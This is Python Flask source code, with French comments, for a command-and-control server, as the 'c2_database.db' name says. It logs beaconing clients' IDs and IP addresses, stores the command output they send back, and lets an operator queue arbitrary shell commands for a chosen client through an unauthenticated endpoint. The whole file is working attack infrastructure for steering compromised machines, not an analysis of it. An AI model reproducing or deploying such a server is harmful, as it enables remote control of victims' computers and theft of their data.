from datetime import datetime
import sqlite3
from flask import Flask, jsonify, request

app = Flask(__name__)
DB_NAME = "c2_database.db"


def init_db():
  # Initialisation des tables si elles n'existent pas
  with sqlite3.connect(DB_NAME) as conn:
    cursor = conn.cursor()
    cursor.execute("""
            CREATE TABLE IF NOT EXISTS clients (
                id TEXT PRIMARY KEY,
                ip_address TEXT,
                first_seen TEXT,
                last_seen TEXT
            )
        """)
    cursor.execute("""
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                command TEXT,
                status TEXT,
                result TEXT,
                created_at TEXT
            )
        """)
    conn.commit()


@app.route("/api/beacon", methods=["POST"])
def handle_beacon():
  content = request.get_json(silent=True)
  if not content:
    return jsonify({"error": "Invalid JSON"}), 400

  client_id = content.get("client_id", "unknown")
  client_result = content.get("result", "")
  client_ip = request.remote_addr
  now = datetime.now().isoformat()

  with sqlite3.connect(DB_NAME) as conn:
    cursor = conn.cursor()

    # 1. Enregistrer ou mettre à jour le client
    cursor.execute(
        "INSERT OR IGNORE INTO clients (id, ip_address, first_seen, last_seen)"
        " VALUES (?, ?, ?, ?)",
        (client_id, client_ip, now, now),
    )
    cursor.execute(
        "UPDATE clients SET last_seen = ?, ip_address = ? WHERE id = ?",
        (now, client_ip, client_id),
    )

    # 2. Si le client renvoie un résultat, mettre à jour sa dernière tâche en cours
    if client_result:
      cursor.execute(
          """UPDATE tasks SET status = 'completed', result = ? 
                   WHERE client_id = ? AND status = 'pending'""",
          (client_result, client_id),
      )
      print(f"\n[+] Résultat reçu de [{client_id}] :\n{client_result}")

    # 3. Chercher une commande en attente (status = 'pending') pour ce client
    cursor.execute(
        """SELECT id, command FROM tasks 
                 WHERE client_id = ? AND status = 'pending' 
                 ORDER BY id ASC LIMIT 1""",
        (client_id,),
    )
    task = cursor.fetchone()

    pending_cmd = ""
    if task:
      pending_cmd = task[1]
      # Optionnel : marquer comme en cours ou laisser tel quel jusqu'au retour du résultat

    conn.commit()

  return jsonify({"status": "ok", "command": pending_cmd}), 200


@app.route("/api/queue", methods=["POST"])
def queue_command():
  data = request.get_json(silent=True)
  if not data or "client_id" not in data or "command" not in data:
    return jsonify({"error": "Missing parameters"}), 400

  target_id = data["client_id"]
  new_cmd = data["command"]
  now = datetime.now().isoformat()

  with sqlite3.connect(DB_NAME) as conn:
    cursor = conn.cursor()
    # Insérer une nouvelle tâche dans la file d'attente
    cursor.execute(
        """INSERT INTO tasks (client_id, command, status, created_at) 
                 VALUES (?, ?, 'pending', ?)""",
        (target_id, new_cmd, now),
    )
    conn.commit()

  return (
      jsonify({"status": "success", "message": "Command added to queue"}),
      200,
  )


if __name__ == "__main__":
  init_db()
  app.run(host="127.0.0.1", port=5000, debug=True)